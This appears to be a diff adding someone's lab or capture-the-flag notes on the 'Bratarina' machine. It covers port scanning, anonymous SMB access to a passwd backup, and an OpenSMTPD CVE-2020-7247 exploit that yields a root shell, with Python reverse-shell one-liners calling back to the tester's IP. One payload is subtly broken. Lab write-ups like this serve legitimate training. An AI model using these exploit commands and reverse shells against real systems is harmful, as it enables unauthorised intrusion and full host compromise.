@@ -1,0 +1,85 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.157.71 > Bratarina.txt
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
+|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
+|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
+25/tcp  open  smtp        OpenSMTPD
+| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.242], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
+80/tcp  open  http        nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title:         Page not found - FlaskBB        
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
+Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-05-15T02:19:21
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: bratarina
+|   NetBIOS computer name: BRATARINA\x00
+|   Domain name: \x00
+|   FQDN: bratarina
+|_  System time: 2026-05-14T22:19:23-04:00
+|_clock-skew: mean: 1h20m01s, deviation: 2h18m36s, median: 0s
+
+
+$ smbclient -L //192.168.157.71 -N$ smbclient -L //192.168.157.71 -N
+backups         Disk      Share for backups
+$ smbclient //192.168.157.71/backups -N
+passwd.bak
+$ cat passwd.bak
+root:x:0:0:root:/root:/bin/bash
+neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
+postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+
+
+Search OpenSMTPD. Found this script.
+https://github.com/minhluannguyen/CVE-2020-7247-reproducer/blob/master/exploit.py
+$ python3 CVE-2020-7247.py
+
+rlwrap nc -nlvp 80
+listening on [any] 80 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.157.71] 54392
+bash: cannot set terminal process group (3244): Inappropriate ioctl for device
+bash: no job control in this shell
+root@bratarina:~# whoami
+root
+
+
+###################################################################################
+below from walkthrough but somehow no working for me
+$ searchsploit OpenSMTPD 
+OpenSMTPD 6.6.1 - Remote Code Execution                 | linux/remote/47984.py
+
+$ searchsploit -m linux/remote/47984.py
+$ python3 47984.py 192.168.157.71 25 id
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+
+python3 47984.py 192.168.157.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"192.168.45.242\\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\"/bin/bash\\")"'
+
+python3 47984.py 192.168.157.71 25 'python -c "import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("192.168.45.242"),int(os.getenv("80"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")"'
+
+
+
+
+
+
+
+
+
